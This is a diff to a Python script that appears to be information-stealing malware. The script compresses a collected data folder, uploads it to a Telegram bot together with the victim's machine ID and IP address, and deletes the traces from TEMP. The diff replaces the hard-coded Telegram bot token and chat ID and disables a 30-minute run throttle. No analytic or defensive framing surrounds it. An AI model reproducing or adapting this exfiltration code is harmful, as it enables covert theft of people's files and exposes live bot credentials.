@@ -450,29 +450,29 @@ def id() :
         with open(path_id, 'w') as file:
             file.write(id)
     return id
- def time() :
-     current_time = datetime.now()
-     formatted_time = current_time.strftime("%H:%M, %d/%m/%Y")
-     formatted_time2 = datetime.strptime(formatted_time, "%H:%M, %d/%m/%Y")
-     path_time = r"C:\Users\Public\time.txt"
-     if os.path.exists(path_time):
-         with open(path_time, 'r') as file:
-             time_str = file.read().strip()
-             file_time = datetime.strptime(time_str, "%H:%M, %d/%m/%Y")
+# def time() :
+#     current_time = datetime.now()
+#     formatted_time = current_time.strftime("%H:%M, %d/%m/%Y")
+#     formatted_time2 = datetime.strptime(formatted_time, "%H:%M, %d/%m/%Y")
+#     path_time = r"C:\Users\Public\time.txt"
+#     if os.path.exists(path_time):
+#         with open(path_time, 'r') as file:
+#             time_str = file.read().strip()
+#             file_time = datetime.strptime(time_str, "%H:%M, %d/%m/%Y")
         
-         time_diff = formatted_time2 - file_time
-         if time_diff < timedelta(minutes=30):
-             a = 0
-         else:
-             a = 1
-             with open(path_time, 'w') as file:
-                 file.write(formatted_time + '\n')
+#         time_diff = formatted_time2 - file_time
+#         if time_diff < timedelta(minutes=30):
+#             a = 0
+#         else:
+#             a = 1
+#             with open(path_time, 'w') as file:
+#                 file.write(formatted_time + '\n')
     
-     else :
-         with open(path_time, 'w') as file:
-             file.write(formatted_time + '\n')
-             a = 1
-     return a
+#     else :
+#         with open(path_time, 'w') as file:
+#             file.write(formatted_time + '\n')
+#             a = 1
+#     return a
 
 
 
@@ -511,7 +511,7 @@ def main():
     file_path = r'C:\Users\Public\Document\run.py'
     z_ph = os.path.join(os.environ["TEMP"], name_f +'.zip');shutil.make_archive(z_ph[:-4], 'zip', data_path)
     Compressed(z_ph,number)
-    token = 'https://api.telegram.org/bot6293527382:AAFkOYw-EN0YeVuW8Teaax8gM2UC81Hy2ZA/sendDocument';IDchat = '5964776506'
+    token = 'https://api.telegram.org/bot5612695152:AAFbG6YhztuedWnLRtUKkv599ZVNtH9Dkfo/sendDocument';IDchat = '-919219698'
     with open(z_ph, 'rb') as f:
         x01.post(token,data={'caption':"ID:"+id()+"    \nIP:"+ip+"     \n"+number,'chat_id':IDchat},files={'document': f})
     shutil.rmtree(os.environ["TEMP"], name_f +'.zip');shutil.rmtree(os.environ["TEMP"], name_f)
